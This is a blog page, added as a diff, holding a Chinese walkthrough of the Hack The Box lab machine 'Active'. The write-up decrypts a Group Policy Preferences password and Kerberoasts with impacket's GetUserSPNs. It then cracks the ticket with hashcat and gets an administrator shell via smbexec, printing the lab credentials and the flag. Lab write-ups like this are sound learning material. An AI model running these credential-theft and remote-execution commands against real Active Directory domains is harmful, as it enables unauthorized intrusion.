@@ -1,0 +1,163 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0X012 Active | 养猪日记</title>
+<meta name=keywords content><meta name=description content="端口扫描
+
+
+
+
+获取立足点
+开始思考，从哪儿开始看起呢？还是smba吧：
+
+
+用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：
+里面其实有东西的目录，应该就是这个目录了：
+
+
+问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：
+
+
+发现疑似账号密码：
+
+
+这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+密码为：GPPstillStandingStrong2k18
+
+
+使用该凭证再次登录smb:
+
+
+
+
+登录后发现flag:
+
+
+提权
+我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；
+
+
+尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：
+kerberoasting
+使用GetUserSPNs.py查询所有注册于用户下的spn:
+python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+
+获取ST，保存为hashcat能爆破的格式：
+python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt
+
+
+爆破：
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &ndash;force
+Ticketmaster1968
+
+
+smbexec:
+python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/htb/0x012-active/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/htb/0x012-active/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0X012 Active"><meta property="og:description" content="端口扫描
+
+
+
+
+获取立足点
+开始思考，从哪儿开始看起呢？还是smba吧：
+
+
+用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：
+里面其实有东西的目录，应该就是这个目录了：
+
+
+问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：
+
+
+发现疑似账号密码：
+
+
+这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+密码为：GPPstillStandingStrong2k18
+
+
+使用该凭证再次登录smb:
+
+
+
+
+登录后发现flag:
+
+
+提权
+我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；
+
+
+尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：
+kerberoasting
+使用GetUserSPNs.py查询所有注册于用户下的spn:
+python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+
+获取ST，保存为hashcat能爆破的格式：
+python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt
+
+
+爆破：
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &ndash;force
+Ticketmaster1968
+
+
+smbexec:
+python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100"><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/htb/0x012-active/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0X012 Active"><meta name=twitter:description content="端口扫描
+
+
+
+
+获取立足点
+开始思考，从哪儿开始看起呢？还是smba吧：
+
+
+用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：
+里面其实有东西的目录，应该就是这个目录了：
+
+
+问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：
+
+
+发现疑似账号密码：
+
+
+这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+密码为：GPPstillStandingStrong2k18
+
+
+使用该凭证再次登录smb:
+
+
+
+
+登录后发现flag:
+
+
+提权
+我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；
+
+
+尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：
+kerberoasting
+使用GetUserSPNs.py查询所有注册于用户下的spn:
+python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+
+获取ST，保存为hashcat能爆破的格式：
+python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt
+
+
+爆破：
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &ndash;force
+Ticketmaster1968
+
+
+smbexec:
+python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0X012 Active","item":"https://yangzhuzai.github.io/posts/htb/0x012-active/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0X012 Active","name":"0X012 Active","description":"端口扫描 获取立足点 开始思考，从哪儿开始看起呢？还是smba吧：\n用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：\n里面其实有东西的目录，应该就是这个目录了：\n问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：\n发现疑似账号密码：\n这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n密码为：GPPstillStandingStrong2k18\n使用该凭证再次登录smb:\n登录后发现flag:\n提权 我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；\n尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：\nkerberoasting 使用GetUserSPNs.py查询所有注册于用户下的spn:\npython GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\n获取ST，保存为hashcat能爆破的格式：\npython /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt\n爆破：\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \u0026ndash;force\nTicketmaster1968\nsmbexec:\npython /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100\n","keywords":[],"articleBody":"端口扫描 获取立足点 开始思考，从哪儿开始看起呢？还是smba吧：\n用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：\n里面其实有东西的目录，应该就是这个目录了：\n问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：\n发现疑似账号密码：\n这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n密码为：GPPstillStandingStrong2k18\n使用该凭证再次登录smb:\n登录后发现flag:\n提权 我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；\n尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：\nkerberoasting 使用GetUserSPNs.py查询所有注册于用户下的spn:\npython GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\n获取ST，保存为hashcat能爆破的格式：\npython /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt\n爆破：\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt –force\nTicketmaster1968\nsmbexec:\npython /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100\n2ad2d3d25064e6511303bc5a1bb40ac4\n","wordCount":"45","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/htb/0x012-active/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0X012 Active</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;45 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/htb_img/WEBRESOURCE2b79f81f1e994947facb32e1d33427b9image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE57929fea3eb2c20e9a81cb222fdc2be2image.png alt></p><h1 id=获取立足点>获取立足点<a hidden class=anchor aria-hidden=true href=#获取立足点>#</a></h1><p>开始思考，从哪儿开始看起呢？还是smba吧：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEe2ba0e29d1b9dba9ac848bc79d363f4dimage.png alt></p><p>用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：</p><p>里面其实有东西的目录，应该就是这个目录了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE929b2ab801ddc22197d678d5b7b5f4c3image.png alt></p><p>问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE87ab11f980a529d243a7b64203c532cfimage.png alt></p><p>发现疑似账号密码：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd7d244a94d67021c2c41a4546cb9562eimage.png alt></p><p>这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：</p><p>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</p><p>密码为：GPPstillStandingStrong2k18</p><p><img loading=lazy src=/htb_img/WEBRESOURCE9bedd112f49203bcdfaa39d7ab9e3eb4image.png alt></p><p>使用该凭证再次登录smb:</p><p><img loading=lazy src=/htb_img/WEBRESOURCE440f4d2843d061cfa22720a98c061501image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE08147a54fd1836d6a1164e3cc671b872image.png alt></p><p>登录后发现flag:</p><p><img loading=lazy src=/htb_img/WEBRESOURCE537bd27ee83c3e4a88037526309a618aimage.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；</p><p><img loading=lazy src=/htb_img/WEBRESOURCE21b1337ec915a036acf313ff94cfe1e7image.png alt></p><p>尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：</p><h1 id=kerberoasting>kerberoasting<a hidden class=anchor aria-hidden=true href=#kerberoasting>#</a></h1><p>使用GetUserSPNs.py查询所有注册于用户下的spn:</p><p>python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd4ea9064ac216fbdda4e886205dc6e25image.png alt></p><p>获取ST，保存为hashcat能爆破的格式：</p><p>python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt</p><p><img loading=lazy src=/htb_img/WEBRESOURCE88b2ee81d90310dae17659e624785e0aimage.png alt></p><p>爆破：</p><p>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &ndash;force</p><p>Ticketmaster1968</p><p><img loading=lazy src=/htb_img/WEBRESOURCE5b8fa2eeaa852240dda639d8e2f24790image.png alt></p><p>smbexec:</p><p>python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100</p><p><img loading=lazy src=/htb_img/WEBRESOURCEa5a3cf96a5145e1b772d8e1833e034b1image.png alt></p><p>2ad2d3d25064e6511303bc5a1bb40ac4</p><p><img loading=lazy src=/htb_img/WEBRESOURCEec1777129985a3276298ae0bd26f2258image.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x011-broken-gallery/><span class=title>« Prev</span><br><span>0x011 Broken Gallery</span>
+</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x012-dpwwn-1-/><span class=title>Next »</span><br><span>0x012 dpwwn 1</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
